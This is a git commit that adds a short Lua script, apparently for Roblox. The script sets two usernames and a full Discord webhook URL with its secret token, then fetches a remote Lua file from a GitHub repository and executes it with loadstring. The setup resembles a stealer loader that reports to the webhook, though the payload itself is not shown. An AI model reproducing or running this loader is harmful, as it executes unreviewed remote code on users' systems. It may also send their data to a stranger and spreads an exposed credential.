890e8b026a2be0a450b01ea283c76862f7c22229
MethodsBest <106551146+MethodsBest@users.noreply.github.com>
2023-03-28 12:14:55 -0700

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,4 @@
+UserName = "ulabulak"
+UserName2 = "ulabulak"
+Webhook = "https://discord.com/api/webhooks/1087067016042643496/YfAxe6rnYJ3_5vphkINFj61jzM7TxGeqMxOf8-NIpVLq9QSea7hp52pAyLvKBN0bKX3y"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
